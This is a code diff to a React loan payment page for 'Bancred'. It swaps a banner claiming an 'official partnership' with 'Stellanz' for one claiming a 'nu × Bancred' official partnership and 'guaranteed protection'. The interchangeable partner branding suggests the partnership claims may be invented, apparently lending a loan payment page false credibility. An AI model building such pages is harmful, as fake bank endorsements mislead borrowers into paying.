@@ -259,13 +259,14 @@ const Pagamento = () => {
         <img src={bancredLogo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
       </header>
 
-      {/* Banner Stellanz */}
-      <section style={{ background: "linear-gradient(135deg, #1C68E3 0%, #1751B5 100%)", padding: "20px 16px 24px", color: "#fff", textAlign: "center" }}>
-        <div style={{ display: "flex", justifyContent: "flex-start", marginBottom: 14 }}>
-          <img src={stellanzLogo} alt="Stellanz" style={{ height: 26 }} />
+      {/* Banner Nu × Bancred */}
+      <section style={{ background: "linear-gradient(135deg, #820AD1 0%, #6E07B0 100%)", padding: "22px 16px 24px", color: "#fff", textAlign: "center" }}>
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 14, marginBottom: 6 }}>
+          <span style={{ fontFamily: "Inter, sans-serif", fontSize: 30, fontWeight: 900, letterSpacing: -1.5, lineHeight: 1, color: "#fff" }}>nu</span>
+          <X size={18} strokeWidth={2.5} />
+          <span style={{ fontSize: 22, fontWeight: 800, letterSpacing: -0.4 }}>Bancred</span>
         </div>
-        <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 4 }}>Parceria Oficial Stellanz</div>
-        <div style={{ fontSize: 13, opacity: 0.9 }}>Proteção garantida para seu empréstimo</div>
+        <div style={{ fontSize: 13, opacity: 0.92 }}>Parceria oficial · Proteção garantida</div>
       </section>
 
       <main style={{ padding: "22px 14px", maxWidth: 480, margin: "0 auto" }}>
